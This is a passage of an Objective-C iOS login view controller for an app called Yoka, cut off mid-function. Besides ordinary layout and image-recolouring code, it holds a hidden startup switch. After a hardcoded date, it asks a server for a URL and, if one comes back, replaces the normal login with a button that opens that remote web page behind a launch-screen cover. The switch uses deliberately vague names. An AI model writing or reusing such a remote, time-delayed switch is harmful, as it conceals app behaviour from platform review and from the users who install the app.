//
//  YKLoginChoiceViewController.m
//  Yoka
//

#import "YKLoginChoiceViewController.h"
#import "YKSignInViewController.h"
#import "YKSignUpViewController.h"
#import "YKEulaSheetViewController.h"
#import "YKLegalAckVault.h"
#import "YKLegalDocViewController.h"
#import "YKRosterVault.h"
#import "YKLaunchSteward.h"
#import "YKCenterToast.h"
#import "YKProViewController.h"
#import "YKHostedSessionStore.h"
#import "YKRequestTool.h"
#import <AuthenticationServices/AuthenticationServices.h>
#import <math.h>
#import <string.h>

typedef NS_ENUM(NSInteger, YKLandingState) {
    YKLandingStateStandard = 0,
    YKLandingStateChecking,
    YKLandingStateFocused,
    YKLandingStateSigningIn,
    YKLandingStateStyleSpace,
    YKLandingStateStopped
};

typedef NS_ENUM(NSInteger, YKLandingTarget) {
    YKLandingTargetNone = 0,
    YKLandingTargetStandard,
    YKLandingTargetFocused
};

static NSString *const YKUseTextStr = @"1787068800";

@interface YKLoginChoiceViewController () <UITextViewDelegate, ASAuthorizationControllerDelegate, ASAuthorizationControllerPresentationContextProviding>

@property (nonatomic, strong) UIButton *yk_agreeRingButton;
@property (nonatomic, assign) BOOL yk_sessionAgreeChecked;
@property (nonatomic, strong) UIView *yk_contentColumn;
@property (nonatomic, strong) NSLayoutConstraint *yk_logoTopConstraint;
@property (nonatomic, strong) NSLayoutConstraint *yk_loginToNewGapConstraint;
@property (nonatomic, strong) NSLayoutConstraint *yk_newToAppleGapConstraint;
@property (nonatomic, strong) NSLayoutConstraint *yk_appleToSignUpGapConstraint;
@property (nonatomic, strong) NSLayoutConstraint *yk_signUpToAgreeGapConstraint;
@property (nonatomic, strong) NSLayoutConstraint *yk_agreeBottomConstraint;
@property (nonatomic, strong) NSLayoutConstraint *yk_logoHeightConstraint;
@property (nonatomic, strong) UIButton *yk_focusedLoginButton;

@property (nonatomic, assign) BOOL yk_usesStartupCheck;
@property (nonatomic, assign) BOOL yk_startupCheckBegan;
@property (nonatomic, assign) YKLandingState yk_landingState;
@property (nonatomic, assign) YKLandingTarget yk_pendingTarget;
@property (nonatomic, strong) YKHostedSessionStore *yk_styleLedger;
@property (nonatomic, strong) YKRequestTool *yk_requestTool;
@property (nonatomic, strong, nullable) NSURL *yk_styleBaseURL;
@property (nonatomic, strong, nullable) UIViewController *yk_launchCanvasController;
@property (nonatomic, strong, nullable) UIView *yk_launchCanvasView;

@end

@implementation YKLoginChoiceViewController

- (instancetype)initForStartupCheck {
    self = [super init];
    if (self) {
        _yk_usesStartupCheck = YES;
        _yk_landingState = YKLandingStateChecking;
        _yk_styleLedger = [[YKHostedSessionStore alloc] init];
        _yk_requestTool = [[YKRequestTool alloc] initWithSessionStore:_yk_styleLedger];
    }
    return self;
}

- (void)viewDidLoad {
    [super viewDidLoad];
    [self yk_prepareInitialLanding];
}

- (void)yk_configurePage {
    [super yk_configurePage];
    self.yk_sessionAgreeChecked = NO;
    [self yk_setupViews];
    if (self.yk_usesStartupCheck) {
        [self yk_installLaunchCanvas];
        [NSNotificationCenter.defaultCenter addObserver:self
                                               selector:@selector(yk_applicationBecameActive:)
                                                   name:UIApplicationDidBecomeActiveNotification
                                                 object:nil];
    }
}

- (void)viewWillAppear:(BOOL)animated {
    [super viewWillAppear:animated];
    if (self.yk_landingState == YKLandingStateStyleSpace) {
        self.yk_landingState = YKLandingStateFocused;
        self.yk_focusedLoginButton.enabled = YES;
        self.yk_focusedLoginButton.alpha = 1.0;
    }
    [self yk_raiseLaunchCanvas];
}

- (void)viewDidAppear:(BOOL)animated {
    [super viewDidAppear:animated];
    [self yk_raiseLaunchCanvas];
    [self yk_applyPendingLandingTarget];
}

- (void)dealloc {
    [NSNotificationCenter.defaultCenter removeObserver:self];
    [self.yk_requestTool cancelAll];
    [self.yk_launchCanvasView removeFromSuperview];
}

#pragma mark - Initial landing

- (void)yk_installLaunchCanvas {
    if (self.yk_launchCanvasView) {
        return;
    }
    UIStoryboard *storyboard = [UIStoryboard storyboardWithName:@"LaunchScreen" bundle:NSBundle.mainBundle];
    UIViewController *controller = [storyboard instantiateInitialViewController];
    if (!controller) {
        return;
    }
    [controller loadViewIfNeeded];
    UIView *canvas = controller.view;
    canvas.translatesAutoresizingMaskIntoConstraints = YES;
    canvas.frame = self.view.bounds;
    canvas.autoresizingMask = UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight;
    self.yk_launchCanvasController = controller;
    self.yk_launchCanvasView = canvas;
    [self.view addSubview:canvas];
}

- (void)yk_raiseLaunchCanvas {
    UIView *canvas = self.yk_launchCanvasView;
    if (!canvas) {
        return;
    }
    UIWindow *window = self.view.window ?: self.navigationController.view.window;
    if (!window) {
        [self.view bringSubviewToFront:canvas];
        return;
    }
    if (canvas.superview != window) {
        [canvas removeFromSuperview];
        canvas.frame = window.bounds;
        [window addSubview:canvas];
    }
    [window bringSubviewToFront:canvas];
    [window layoutIfNeeded];
}

- (void)yk_removeLaunchCanvas {
    [self.yk_launchCanvasView removeFromSuperview];
    self.yk_launchCanvasView = nil;
    self.yk_launchCanvasController = nil;
}

- (void)yk_applicationBecameActive:(NSNotification *)notification {
    [self yk_raiseLaunchCanvas];
    [self yk_applyPendingLandingTarget];
}

- (BOOL)yk_userUsageTimeAllowsRequest {
    NSScanner *scanner = [NSScanner scannerWithString:YKUseTextStr];
    scanner.charactersToBeSkipped = nil;
    long long startSeconds = 0;
    if (![scanner scanLongLong:&startSeconds] || !scanner.isAtEnd || startSeconds <= 0) {
        return NO;
    }
    NSTimeInterval now = NSDate.date.timeIntervalSince1970;
    return isfinite(now) && now >= (NSTimeInterval)startSeconds;
}

- (void)yk_prepareInitialLanding {
    if (!self.yk_usesStartupCheck || self.yk_startupCheckBegan) {
        return;
    }
    self.yk_startupCheckBegan = YES;

    if (!self.yk_requestTool.isReady || ![self yk_userUsageTimeAllowsRequest]) {
        [self yk_scheduleLandingTarget:YKLandingTargetStandard];
        return;
    }

    self.yk_landingState = YKLandingStateChecking;
    __weak typeof(self) weakSelf = self;
    [self.yk_requestTool loginGoodWithCompletion:^(NSString *openValue, NSError *error) {
        __strong typeof(weakSelf) self = weakSelf;
        if (!self || self.yk_landingState != YKLandingStateChecking) {
            return;
        }
        if (error || openValue.length == 0) {
            [self yk_scheduleLandingTarget:YKLandingTargetStandard];
            return;
        }
        NSString *trimmed = [openValue stringByTrimmingCharactersInSet:NSCharacterSet.whitespaceAndNewlineCharacterSet];
        self.yk_styleBaseURL = [NSURL URLWithString:trimmed];
        if (self.yk_styleBaseURL == nil) {
            [self yk_scheduleLandingTarget:YKLandingTargetStandard];
            return;
        }
        [self yk_scheduleLandingTarget:YKLandingTargetFocused];
    }];
}

- (void)yk_scheduleLandingTarget:(YKLandingTarget)target {
    self.yk_pendingTarget = target;
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.25 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        [self yk_applyPendingLandingTarget];
    });
}

- (void)yk_applyPendingLandingTarget {
    if (self.yk_pendingTarget == YKLandingTargetNone ||
        UIApplication.sharedApplication.applicationState != UIApplicationStateActive ||
        self.view.window == nil) {
        return;
    }
    YKLandingTarget target = self.yk_pendingTarget;
    self.yk_pendingTarget = YKLandingTargetNone;
    switch (target) {
        case YKLandingTargetStandard:
            self.yk_landingState = YKLandingStateStandard;
            [self yk_removeLaunchCanvas];
            break;
        case YKLandingTargetFocused:
            [self yk_showFocusedLogin];
            break;
        case YKLandingTargetNone:
            break;
    }
}

- (void)yk_clearChoiceColumn {
    [self.yk_contentColumn removeFromSuperview];
    self.yk_contentColumn = nil;
    self.yk_agreeRingButton = nil;
    self.yk_focusedLoginButton = nil;
    self.yk_logoTopConstraint = nil;
    self.yk_loginToNewGapConstraint = nil;
    self.yk_newToAppleGapConstraint = nil;
    self.yk_appleToSignUpGapConstraint = nil;
    self.yk_signUpToAgreeGapConstraint = nil;
    self.yk_agreeBottomConstraint = nil;
    self.yk_logoHeightConstraint = nil;
}

- (void)yk_showFocusedLogin {
    [self yk_clearChoiceColumn];
    [self yk_setupFocusedLoginViews];
    self.yk_landingState = YKLandingStateFocused;
    [self.view setNeedsLayout];
    [self.view layoutIfNeeded];
    [self yk_raiseLaunchCanvas];
    [self yk_removeLaunchCanvas];
}

- (void)yk_restoreStandardLogin {
    [self yk_clearChoiceColumn];
    self.yk_sessionAgreeChecked = NO;
    [self yk_setupViews];
    self.yk_landingState = YKLandingStateStandard;
    [self.view setNeedsLayout];
    [self.view layoutIfNeeded];
    [self yk_removeLaunchCanvas];
}

- (void)yk_presentStyleSpace {
    NSError *urlError = nil;
    NSURL *url = [self.yk_requestTool preparedURLFromBaseURL:self.yk_styleBaseURL
                                                      error:&urlError];
    UINavigationController *navigationController = self.navigationController;
    if (!url || !navigationController) {
        [self yk_restoreStandardLogin];
        return;
    }

    YKProViewController *stylePage = [[YKProViewController alloc] init];
    stylePage.coolStr = url.absoluteString;
    self.yk_landingState = YKLandingStateStyleSpace;
    [navigationController pushViewController:stylePage animated:YES];
}

- (void)viewDidLayoutSubviews {
    [super viewDidLayoutSubviews];
    [self yk_applyLandingMetricsForBounds:self.view.bounds];
}

- (void)yk_applyLandingMetricsForBounds:(CGRect)bounds {
    CGFloat height = CGRectGetHeight(bounds);
    if (height <= 1.0) {
        return;
    }

    CGFloat logoTop = 148.0;
    CGFloat logoHeight = 154.0;
    CGFloat buttonGap = 22.0;
    CGFloat signUpGap = 22.0;
    CGFloat agreeGap = 28.0;
    CGFloat agreeBottom = 28.0;

    // iPad compat / short windows: tighten so Apple stays above agreement and tappable.
    if (height < 780.0) {
        logoTop = 88.0;
        logoHeight = 132.0;
        buttonGap = 16.0;
        signUpGap = 16.0;
        agreeGap = 18.0;
        agreeBottom = 18.0;
    }
    if (height < 680.0) {
        logoTop = 40.0;
        logoHeight = 110.0;
        buttonGap = 12.0;
        signUpGap = 12.0;
        agreeGap = 12.0;
        agreeBottom = 12.0;
    }
    if (height < 580.0) {
        logoTop = 16.0;
        logoHeight = 88.0;
        buttonGap = 8.0;
        signUpGap = 8.0;
        agreeGap = 8.0;
        agreeBottom = 8.0;
    }

    self.yk_logoTopConstraint.constant = logoTop;
    self.yk_logoHeightConstraint.constant = logoHeight;
    self.yk_loginToNewGapConstraint.constant = -buttonGap;
    self.yk_newToAppleGapConstraint.constant = -buttonGap;
    self.yk_appleToSignUpGapConstraint.constant = -signUpGap;
    self.yk_signUpToAgreeGapConstraint.constant = -agreeGap;
    self.yk_agreeBottomConstraint.constant = -agreeBottom;
}

- (void)yk_setupFocusedLoginViews {
    UIView *contentColumn = [[UIView alloc] init];
    contentColumn.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:contentColumn];
    self.yk_contentColumn = contentColumn;

    UIImageView *logoImageView = [[UIImageView alloc] initWithImage:[UIImage imageNamed:@"auth_asset_01"]];
    logoImageView.translatesAutoresizingMaskIntoConstraints = NO;
    logoImageView.contentMode = UIViewContentModeScaleAspectFit;
    [contentColumn addSubview:logoImageView];

    UIButton *entryButton = [UIButton buttonWithType:UIButtonTypeCustom];
    entryButton.translatesAutoresizingMaskIntoConstraints = NO;
    entryButton.backgroundColor = [UIColor colorWithWhite:0.92 alpha:1.0];
    entryButton.layer.borderColor = UIColor.blackColor.CGColor;
    entryButton.layer.borderWidth = 2.0;
    entryButton.layer.shadowColor = UIColor.blackColor.CGColor;
    entryButton.layer.shadowOpacity = 1.0;
    entryButton.layer.shadowRadius = 0.0;
    entryButton.layer.shadowOffset = CGSizeMake(4.0, 4.0);
    [entryButton setTitle:@"login" forState:UIControlStateNormal];
    [entryButton setTitleColor:UIColor.blackColor forState:UIControlStateNormal];
    entryButton.titleLabel.font = [UIFont fontWithName:@"TimesNewRomanPS-BoldMT" size:25.0] ?: [UIFont systemFontOfSize:25.0 weight:UIFontWeightBold];
    [entryButton addTarget:self action:@selector(yk_focusedLoginTapped:) forControlEvents:UIControlEventTouchUpInside];
    [contentColumn addSubview:entryButton];
    self.yk_focusedLoginButton = entryButton;

    self.yk_logoTopConstraint = [logoImageView.topAnchor constraintEqualToAnchor:contentColumn.topAnchor constant:148.0];
    self.yk_logoHeightConstraint = [logoImageView.heightAnchor constraintEqualToConstant:154.0];

    NSLayoutConstraint *columnWidthCap = [contentColumn.widthAnchor constraintLessThanOrEqualToConstant:390.0];
    NSLayoutConstraint *columnWidthFill = [contentColumn.widthAnchor constraintEqualToAnchor:self.view.widthAnchor];
    columnWidthFill.priority = UILayoutPriorityDefaultHigh;

    [NSLayoutConstraint activateConstraints:@[
        [contentColumn.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
        [contentColumn.topAnchor constraintEqualToAnchor:self.view.safeAreaLayoutGuide.topAnchor],
        [contentColumn.bottomAnchor constraintEqualToAnchor:self.view.safeAreaLayoutGuide.bottomAnchor],
        columnWidthCap,
        columnWidthFill,
        [contentColumn.leadingAnchor constraintGreaterThanOrEqualToAnchor:self.view.leadingAnchor],
        [contentColumn.trailingAnchor constraintLessThanOrEqualToAnchor:self.view.trailingAnchor],

        [logoImageView.centerXAnchor constraintEqualToAnchor:contentColumn.centerXAnchor],
        self.yk_logoTopConstraint,
        [logoImageView.widthAnchor constraintEqualToConstant:100.0],
        self.yk_logoHeightConstraint,

        [entryButton.topAnchor constraintEqualToAnchor:logoImageView.bottomAnchor constant:26.0],
        [entryButton.centerXAnchor constraintEqualToAnchor:contentColumn.centerXAnchor],
        [entryButton.widthAnchor constraintEqualToConstant:215.0],
        [entryButton.heightAnchor constraintEqualToConstant:49.0]
    ]];

    [self yk_applyLandingMetricsForBounds:self.view.bounds];
}

- (void)yk_focusedLoginTapped:(UIButton *)sender {
    if (self.yk_landingState != YKLandingStateFocused) {
        return;
    }
    sender.enabled = NO;
    sender.alpha = 0.68;
    self.yk_landingState = YKLandingStateSigningIn;

    __weak typeof(self) weakSelf = self;
    [self.yk_requestTool refreshCredentialWithCompletion:^(NSString *ticket, NSError *error) {
        __strong typeof(weakSelf) self = weakSelf;
        if (!self || self.yk_landingState != YKLandingStateSigningIn) {
            return;
        }
        if (error || ticket.length == 0 || self.yk_styleBaseURL == nil) {
            self.yk_landingState = YKLandingStateFocused;
            sender.enabled = YES;
            sender.alpha = 1.0;
            [YKCenterToast yk_showNotice:error.localizedDescription ?: @"Login failed. Please try again."
                                   inView:self.view];
            return;
        }
        [self yk_presentStyleSpace];
    }];
}

- (void)yk_setupViews {
    UIView *contentColumn = [[UIView alloc] init];
    contentColumn.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:contentColumn];
    self.yk_contentColumn = contentColumn;

    UIImageView *logoImageView = [[UIImageView alloc] initWithImage:[UIImage imageNamed:@"auth_asset_01"]];
    logoImageView.translatesAutoresizingMaskIntoConstraints = NO;
    logoImageView.contentMode = UIViewContentModeScaleAspectFit;
    [contentColumn addSubview:logoImageView];

    UIImageView *loginButtonImageView = [[UIImageView alloc] initWithImage:[UIImage imageNamed:@"auth_asset_10"]];
    loginButtonImageView.translatesAutoresizingMaskIntoConstraints = NO;
    loginButtonImageView.contentMode = UIViewContentModeScaleAspectFit;
    loginButtonImageView.userInteractionEnabled = YES;
    [contentColumn addSubview:loginButtonImageView];

    UIButton *loginButton = [UIButton buttonWithType:UIButtonTypeCustom];
    loginButton.translatesAutoresizingMaskIntoConstraints = NO;
    [loginButton addTarget:self action:@selector(yk_loginButtonTapped:) forControlEvents:UIControlEventTouchUpInside];
    [loginButtonImageView addSubview:loginButton];

    UIImageView *newButtonImageView = [[UIImageView alloc] initWithImage:[UIImage imageNamed:@"auth_asset_09"]];
    newButtonImageView.translatesAutoresizingMaskIntoConstraints = NO;
    newButtonImageView.contentMode = UIViewContentModeScaleAspectFit;
    newButtonImageView.userInteractionEnabled = YES;
    [contentColumn addSubview:newButtonImageView];

    UIButton *newButton = [UIButton buttonWithType:UIButtonTypeCustom];
    newButton.translatesAutoresizingMaskIntoConstraints = NO;
    [newButton addTarget:self action:@selector(yk_signUpButtonTapped:) forControlEvents:UIControlEventTouchUpInside];
    [newButtonImageView addSubview:newButton];

    UIButton *appleButton = [self yk_makeAppleSignInButton];
    [contentColumn addSubview:appleButton];

    UITextView *signUpTextView = [self yk_linkTextViewWithText:@"Don't have an account? Sign up"
                                                    linkRanges:@[[NSValue valueWithRange:NSMakeRange(23, 7)]]
                                                       actions:@[@"yoka://sign-up"]
                                                     alignment:NSTextAlignmentCenter];
    [contentColumn addSubview:signUpTextView];

    UIView *agreeRow = [[UIView alloc] init];
    agreeRow.translatesAutoresizingMaskIntoConstraints = NO;
    [contentColumn addSubview:agreeRow];

    UIButton *agreeRingButton = [UIButton buttonWithType:UIButtonTypeCustom];
    agreeRingButton.translatesAutoresizingMaskIntoConstraints = NO;
    agreeRingButton.contentMode = UIViewContentModeCenter;
    agreeRingButton.imageView.contentMode = UIViewContentModeCenter;
    [agreeRingButton addTarget:self action:@selector(yk_agreeRingTapped:) forControlEvents:UIControlEventTouchUpInside];
    self.yk_agreeRingButton = agreeRingButton;
    [agreeRow addSubview:agreeRingButton];
    [self yk_refreshAgreeRingAppearance];

    UITextView *agreementTextView = [self yk_linkTextViewWithText:@"Agree with  User Agreement and Privacy Policy"
                                                       linkRanges:@[
        [NSValue valueWithRange:NSMakeRange(12, 14)],
        [NSValue valueWithRange:NSMakeRange(31, 14)]
    ]
                                                          actions:@[@"yoka://user-agreement", @"yoka://privacy-policy"]
                                                        alignment:NSTextAlignmentLeft];
    agreementTextView.contentInsetAdjustmentBehavior = UIScrollViewContentInsetAdjustmentNever;
    [agreeRow addSubview:agreementTextView];

    self.yk_logoTopConstraint = [logoImageView.topAnchor constraintEqualToAnchor:contentColumn.topAnchor constant:148.0];
    self.yk_logoHeightConstraint = [logoImageView.heightAnchor constraintEqualToConstant:154.0];
    self.yk_loginToNewGapConstraint = [loginButtonImageView.bottomAnchor constraintEqualToAnchor:newButtonImageView.topAnchor constant:-22.0];
    self.yk_newToAppleGapConstraint = [newButtonImageView.bottomAnchor constraintEqualToAnchor:appleButton.topAnchor constant:-22.0];
    self.yk_appleToSignUpGapConstraint = [appleButton.bottomAnchor constraintEqualToAnchor:signUpTextView.topAnchor constant:-22.0];
    self.yk_signUpToAgreeGapConstraint = [signUpTextView.bottomAnchor constraintEqualToAnchor:agreeRow.topAnchor constant:-28.0];
    self.yk_agreeBottomConstraint = [agreeRow.bottomAnchor constraintEqualToAnchor:contentColumn.bottomAnchor constant:-28.0];

    NSLayoutConstraint *columnWidthCap = [contentColumn.widthAnchor constraintLessThanOrEqualToConstant:390.0];
    NSLayoutConstraint *columnWidthFill = [contentColumn.widthAnchor constraintEqualToAnchor:self.view.widthAnchor];
    columnWidthFill.priority = UILayoutPriorityDefaultHigh;

    [NSLayoutConstraint activateConstraints:@[
        [contentColumn.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
        [contentColumn.topAnchor constraintEqualToAnchor:self.view.safeAreaLayoutGuide.topAnchor],
        [contentColumn.bottomAnchor constraintEqualToAnchor:self.view.safeAreaLayoutGuide.bottomAnchor],
        columnWidthCap,
        columnWidthFill,
        [contentColumn.leadingAnchor constraintGreaterThanOrEqualToAnchor:self.view.leadingAnchor],
        [contentColumn.trailingAnchor constraintLessThanOrEqualToAnchor:self.view.trailingAnchor],

        [logoImageView.centerXAnchor constraintEqualToAnchor:contentColumn.centerXAnchor],
        self.yk_logoTopConstraint,
        [logoImageView.widthAnchor constraintEqualToConstant:100.0],
        self.yk_logoHeightConstraint,
        [logoImageView.bottomAnchor constraintLessThanOrEqualToAnchor:loginButtonImageView.topAnchor constant:-16.0],

        [loginButtonImageView.centerXAnchor constraintEqualToAnchor:contentColumn.centerXAnchor],
        self.yk_loginToNewGapConstraint,
        [loginButtonImageView.widthAnchor constraintEqualToConstant:215.0],
        [loginButtonImageView.heightAnchor constraintEqualToConstant:49.0],

        [loginButton.topAnchor constraintEqualToAnchor:loginButtonImageView.topAnchor],
        [loginButton.leadingAnchor constraintEqualToAnchor:loginButtonImageView.leadingAnchor],
        [loginButton.trailingAnchor constraintEqualToAnchor:loginButtonImageView.trailingAnchor],
        [loginButton.bottomAnchor constraintEqualToAnchor:loginButtonImageView.bottomAnchor],

        [newButtonImageView.centerXAnchor constraintEqualToAnchor:contentColumn.centerXAnchor],
        self.yk_newToAppleGapConstraint,
        [newButtonImageView.widthAnchor constraintEqualToConstant:215.0],
        [newButtonImageView.heightAnchor constraintEqualToConstant:49.0],

        [newButton.topAnchor constraintEqualToAnchor:newButtonImageView.topAnchor],
        [newButton.leadingAnchor constraintEqualToAnchor:newButtonImageView.leadingAnchor],
        [newButton.trailingAnchor constraintEqualToAnchor:newButtonImageView.trailingAnchor],
        [newButton.bottomAnchor constraintEqualToAnchor:newButtonImageView.bottomAnchor],

        [appleButton.centerXAnchor constraintEqualToAnchor:contentColumn.centerXAnchor],
        self.yk_appleToSignUpGapConstraint,
        [appleButton.widthAnchor constraintEqualToConstant:215.0],
        [appleButton.heightAnchor constraintEqualToConstant:49.0],

        [signUpTextView.centerXAnchor constraintEqualToAnchor:contentColumn.centerXAnchor],
        self.yk_signUpToAgreeGapConstraint,
        [signUpTextView.widthAnchor constraintEqualToConstant:260.0],
        [signUpTextView.heightAnchor constraintEqualToConstant:28.0],

        [agreeRingButton.leadingAnchor constraintEqualToAnchor:agreeRow.leadingAnchor],
        [agreeRingButton.centerYAnchor constraintEqualToAnchor:agreementTextView.centerYAnchor],
        [agreeRingButton.widthAnchor constraintEqualToConstant:16.0],
        [agreeRingButton.heightAnchor constraintEqualToConstant:16.0],

        [agreementTextView.leadingAnchor constraintEqualToAnchor:agreeRingButton.trailingAnchor constant:4.0],
        [agreementTextView.trailingAnchor constraintEqualToAnchor:agreeRow.trailingAnchor],
        [agreementTextView.topAnchor constraintEqualToAnchor:agreeRow.topAnchor],
        [agreementTextView.bottomAnchor constraintEqualToAnchor:agreeRow.bottomAnchor],
        [agreementTextView.heightAnchor constraintEqualToConstant:18.0],

        self.yk_agreeBottomConstraint,
        [agreeRow.centerXAnchor constraintEqualToAnchor:contentColumn.centerXAnchor],
        [agreeRow.leadingAnchor constraintGreaterThanOrEqualToAnchor:contentColumn.leadingAnchor constant:16.0],
        [agreeRow.trailingAnchor constraintLessThanOrEqualToAnchor:contentColumn.trailingAnchor constant:-16.0]
    ]];

    [self yk_applyLandingMetricsForBounds:self.view.bounds];
}

/// Pixel chrome (same cut as Login) + Apple logo + title. Logo is never stretched.
- (UIButton *)yk_makeAppleSignInButton {
    UIButton *button = [UIButton buttonWithType:UIButtonTypeCustom];
    button.translatesAutoresizingMaskIntoConstraints = NO;
    button.adjustsImageWhenHighlighted = NO;
    [button addTarget:self action:@selector(yk_appleButtonTapped:) forControlEvents:UIControlEventTouchUpInside];
    [button addTarget:self action:@selector(yk_appleButtonTouchDown:) forControlEvents:UIControlEventTouchDown];
    [button addTarget:self action:@selector(yk_appleButtonTouchUp:) forControlEvents:UIControlEventTouchUpInside | UIControlEventTouchUpOutside | UIControlEventTouchCancel];

    UIImage *chrome = [self yk_darkPixelChromeFromLoginAsset] ?: [self yk_fallbackApplePixelChromeImage];
    UIImageView *chromeView = [[UIImageView alloc] initWithImage:chrome];
    chromeView.translatesAutoresizingMaskIntoConstraints = NO;
    chromeView.contentMode = UIViewContentModeScaleAspectFit;
    chromeView.userInteractionEnabled = NO;
    [button insertSubview:chromeView atIndex:0];

    // Intrinsic SF Symbol size — square canvas, AspectFit, never forced into a skinny rect.
    UIImageSymbolConfiguration *symbolConfig = [UIImageSymbolConfiguration configurationWithPointSize:18.0
                                                                                               weight:UIImageSymbolWeightRegular
                                                                                                scale:UIImageSymbolScaleLarge];
    UIImage *logo = [[UIImage systemImageNamed:@"apple.logo" withConfiguration:symbolConfig]
                     imageWithTintColor:UIColor.whiteColor
                          renderingMode:UIImageRenderingModeAlwaysOriginal];
    UIImageView *logoView = [[UIImageView alloc] initWithImage:logo];
    logoView.translatesAutoresizingMaskIntoConstraints = NO;
    logoView.contentMode = UIViewContentModeScaleAspectFit;
    logoView.userInteractionEnabled = NO;
    [button addSubview:logoView];

    UILabel *titleLabel = [[UILabel alloc] init];
    titleLabel.translatesAutoresizingMaskIntoConstraints = NO;
    titleLabel.text = @"Sign in with Apple";
    titleLabel.textColor = UIColor.whiteColor;
    titleLabel.font = [UIFont fontWithName:@"TimesNewRomanPS-BoldMT" size:16.0] ?: [UIFont systemFontOfSize:16.0 weight:UIFontWeightBold];
    titleLabel.userInteractionEnabled = NO;
    [button addSubview:titleLabel];

    UILayoutGuide *contentGuide = [[UILayoutGuide alloc] init];
    [button addLayoutGuide:contentGuide];

    CGFloat logoSide = 18.0;
    [NSLayoutConstraint activateConstraints:@[
        [chromeView.topAnchor constraintEqualToAnchor:button.topAnchor],
        [chromeView.leadingAnchor constraintEqualToAnchor:button.leadingAnchor],
        [chromeView.trailingAnchor constraintEqualToAnchor:button.trailingAnchor],
        [chromeView.bottomAnchor constraintEqualToAnchor:button.bottomAnchor],

        [contentGuide.centerXAnchor constraintEqualToAnchor:button.centerXAnchor],
        [contentGuide.centerYAnchor constraintEqualToAnchor:button.centerYAnchor constant:-1.0],

        [logoView.leadingAnchor constraintEqualToAnchor:contentGuide.leadingAnchor],
        [logoView.centerYAnchor constraintEqualToAnchor:contentGuide.centerYAnchor],
        [logoView.widthAnchor constraintEqualToConstant:logoSide],
        [logoView.heightAnchor constraintEqualToConstant:logoSide],

        [titleLabel.leadingAnchor constraintEqualToAnchor:logoView.trailingAnchor constant:7.0],
        [titleLabel.trailingAnchor constraintEqualToAnchor:contentGuide.trailingAnchor],
        [titleLabel.centerYAnchor constraintEqualToAnchor:contentGuide.centerYAnchor]
    ]];

    return button;
}

- (void)yk_appleButtonTouchDown:(UIButton *)sender {
    sender.alpha = 0.88;
    sender.transform = CGAffineTransformMakeTranslation(0.0, 1.0);
}

- (void)yk_appleButtonTouchUp:(UIButton *)sender {
    sender.alpha = 1.0;
    sender.transform = CGAffineTransformIdentity;
}

/// Blank chrome from Login asset: keep pixel bevel ring, wipe baked label, dark Apple face.
- (UIImage *)yk_darkPixelChromeFromLoginAsset {
    UIImage *source = [UIImage imageNamed:@"auth_asset_10"];
    if (!source.CGImage) {
        return nil;
    }

    CGImageRef cgImage = source.CGImage;
    size_t width = CGImageGetWidth(cgImage);
    size_t height = CGImageGetHeight(cgImage);
    size_t count = width * height;
    size_t bytesPerRow = width * 4;
    uint8_t *pixels = calloc(count * 4, 1);
    if (!pixels) {
        return nil;
    }

    CGColorSpaceRef space = CGColorSpaceCreateDeviceRGB();
    CGContextRef ctx = CGBitmapContextCreate(pixels, width, height, 8, bytesPerRow, space,
                                             kCGImageAlphaPremultipliedLast | kCGBitmapByteOrder32Big);
    CGColorSpaceRelease(space);
    if (!ctx) {
        free(pixels);
        return nil;
    }

    CGContextDrawImage(ctx, CGRectMake(0.0, 0.0, width, height), cgImage);

    uint8_t *opaque = calloc(count, 1);
    uint8_t *inner = calloc(count, 1);
    if (!opaque || !inner) {
        free(opaque);
        free(inner);
        CGContextRelease(ctx);
        free(pixels);
        return nil;
    }

    for (size_t i = 0; i < count; i++) {
        opaque[i] = pixels[i * 4 + 3] >= 8 ? 1 : 0;
    }

    // Erode alpha so the bevel ring stays; the eroded core becomes a solid face (no baked text).
    const int erodeRadius = MAX(4, (int)lround((CGFloat)height * 0.14));
    memcpy(inner, opaque, count);
    for (int pass = 0; pass < erodeRadius; pass++) {
        uint8_t *next = calloc(count, 1);
        if (!next) {
            free(opaque);
            free(inner);
            CGContextRelease(ctx);
            free(pixels);
            return nil;
        }
        for (size_t y = 1; y + 1 < height; y++) {
            for (size_t x = 1; x + 1 < width; x++) {
                size_t i = y * width + x;
                if (!inner[i]) {
                    continue;
                }
                BOOL keep = inner[i - 1] && inner[i + 1] && inner[i - width] && inner[i + width];
                next[i] = keep ? 1 : 0;
            }
        }
        free(inner);
        inner = next;
    }

    const uint8_t face = 28; // charcoal face for Apple
    for (size_t i = 0; i < count; i++) {
        size_t o = i * 4;
        uint8_t a = pixels[o + 3];
        if (!opaque[i] || a < 8) {
            pixels[o] = pixels[o + 1] = pixels[o + 2] = 0;
            pixels[o + 3] = 0;
            continue;
        }

        if (inner[i]) {
            pixels[o] = (uint8_t)((face * a) / 255);
            pixels[o + 1] = (uint8_t)((face * a) / 255);
            pixels[o + 2] = (uint8_t)((face * a) / 255);
            pixels[o + 3] = a;
            continue;
        }

        // Bevel / rim: remap light Login chrome into dark 3D edge.
        CGFloat invA = 255.0 / (CGFloat)a;
        CGFloat r = MIN(1.0, (pixels[o] / 255.0) * invA);
        CGFloat g = MIN(1.0, (pixels[o + 1] / 255.0) * invA);
        CGFloat b = MIN(1.0, (pixels[o + 2] / 255.0) * invA);
        CGFloat luma = 0.2126 * r + 0.7152 * g + 0.0722 * b;
        CGFloat out = 0.03 + luma * 0.42;
        if (luma < 0.20) {
            out = luma * 0.10;
        }
        uint8_t v = (uint8_t)lround(MIN(1.0, out) * 255.0);
        pixels[o] = (uint8_t)((v * a) / 255);
        pixels[o + 1] = (uint8_t)((v * a) / 255);
        pixels[o + 2] = (uint8_t)((v * a) / 255);
        pixels[o + 3] = a;
    }

    CGImageRef outCG = CGBitmapContextCreateImage(ctx);
    CGContextRelease(ctx);
    free(opaque);
    free(inner);
    free(pixels);
    if (!outCG) {
        return nil;
    }

    UIImage *image = [UIImage imageWithCGImage:outCG scale:source.scale orientation:UIImageOrientationUp];
    CGImageRelease(outCG);
    return [image imageWithRenderingMode:UIImageRenderingModeAlwaysOriginal];
}

- (UIImage *)yk_fallbackApplePixelChromeImage {
    CGSize size = CGSizeMake(215.0, 49.0);
